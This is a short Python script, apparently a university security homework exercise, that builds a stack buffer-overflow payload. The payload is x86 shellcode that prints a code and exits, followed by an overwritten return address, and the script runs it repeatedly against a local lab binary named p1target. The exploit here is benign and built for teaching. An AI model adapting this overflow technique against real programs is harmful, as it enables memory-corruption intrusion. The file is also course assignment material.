import os

# these are the bytes you need to insert into memory and return to.
# Much like the censor problem on HW 4, they will print a code 
# of lowercase letters to the screen
shellcode=b'\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xb9\x3d\xa0\x04\x08\xb2\x02\xcd\x80\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xb9\x57\xa0\x04\x08\xb2\x03\xcd\x80\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\xb9\x79\xa0\x04\x08\xb2\x02\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80'


ret=b'\xc4\xd4\x9a\xff'

# you might need to modify this line to make the attack faster
evilinput = shellcode+ret 

#print(evilinput.hex())

for i in range(10):
    # don't change the code below 
    retcode=os.system(b'./p1target "'+evilinput+b'"')
    if (retcode==0):
        break
